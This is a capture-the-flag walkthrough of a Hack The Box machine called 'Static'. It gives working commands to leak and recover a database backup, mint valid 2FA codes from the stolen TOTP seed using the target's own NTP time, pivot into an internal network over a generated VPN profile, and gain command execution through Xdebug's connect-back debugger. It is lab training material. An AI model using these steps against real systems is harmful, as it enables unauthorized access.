## Overview

Static is a Hard Linux machine built around a VPN provisioning portal. A web app on port 8080 uses default credentials but gates the admin panel behind TOTP 2FA. An exposed, corrupted database backup leaks the TOTP seed, and because the box also runs an NTP server we can sync time precisely and generate valid 2FA codes. The admin panel issues an OpenVPN profile into an internal network, where an internal web host runs PHP with Xdebug's `remote_connect_back` enabled — a no-auth path to remote code execution as `www-data` and the user flag. This post stops at user.

## Recon

| Port | Service |
|------|---------|
| 22   | OpenSSH |
| 2222 | OpenSSH |
| 8080 | Apache httpd (web portal) |
| 123/udp | NTP |

```bash
nmap -sC -sV 10.129.48.123
curl http://10.129.48.123:8080/robots.txt
```

`robots.txt` disallows two telling paths:

```
Disallow: /vpn/
Disallow: /.ftp_uploads/
```

`/vpn/` is a login portal; `/.ftp_uploads/` is a directory listing holding a `warning.txt` and a compressed database backup.

## Enumeration

The `/vpn/` portal accepts default credentials `admin/admin`, but then demands a 2FA code:

```bash
# login (cookie jar), then 2FA prompt appears at login.php
curl -c cj -d "username=admin&password=admin&submit=Login" http://10.129.48.123:8080/vpn/login.php
```

`/.ftp_uploads/` holds a database backup that fails to decompress with a CRC error — it was corrupted in transit (FTP ASCII mode mangling binary data). It's recoverable with `gzrecover`:

```bash
git clone https://github.com/arenn/gzrt && make -C gzrt
./gzrt/gzrecover db.sql.gz       # -> db.sql.recovered
```

The recovered SQL contains the admin row including a TOTP secret. The catch: TOTP codes depend on the current time, and the server's clock may differ from ours. Since the box runs an NTP server, we can sync to its exact time.

## Foothold

Generate a valid 2FA code from the leaked TOTP secret, using the **target's** NTP time so there's no clock skew:

```bash
python3 -c "import pyotp,struct,socket; s=socket.socket(2,2); s.settimeout(5); s.sendto(b'\x1b'+47*b'\0',('10.129.48.123',123)); d,_=s.recvfrom(1024); t=struct.unpack('!12I',d)[10]-2208988800; print(pyotp.TOTP('<redacted_secret>').at(t))"
curl -b cj -d "code=<CODE>" http://10.129.48.123:8080/vpn/login.php   # -> panel.php
```

![totp 2fa bypass](/assets/Images/static-001_foothold_totp-2fa-bypass.png)

The admin panel reveals an internal host map and a form that generates an OpenVPN client config:

![internal host map](/assets/Images/static-002_enum_panel-hostmap.png)

```bash
curl -b cj http://10.129.48.123:8080/vpn/panel.php -d "cn=trx" -o trx.ovpn
```

![vpn config generated](/assets/Images/static-003_foothold_vpn-config-gen.png)

Connecting drops us onto an internal `172.30.0.0/16` tunnel; adding a route exposes the `172.20.0.0/24` segment where a web host lives:

```bash
sudo openvpn --config trx.ovpn --disable-dco --daemon --log vpn.log
sudo ip route add 172.20.0.0/24 via 172.30.0.1
```

The internal web host (`172.20.0.10`) serves an `info.php` that leaks its PHP config — including **Xdebug 2.6 with `remote_connect_back=On`**. That setting tells Xdebug to open a debugger connection back to whoever made the request, with no authentication. Triggering a debug session lets us run arbitrary PHP via the DBGp `eval` command:

```bash
curl -s http://172.20.0.10/info.php | grep -iE 'xdebug version|remote_connect_back|remote_enable'
# gteissier xdebug-shell: listener on :9000 + trigger -> eval(shell_exec)
echo 'id; cat /home/user.txt' | python2 xdebug-shell.py --local-host=<tun_ip> --url=http://172.20.0.10/info.php
```

> Note: the Xdebug connect-back has a very short timeout — a high-latency VPN resets every connection before the handshake completes. A region-matched, low-latency VPN is required for this step to land.

That gives execution as `www-data` on the `web` host.
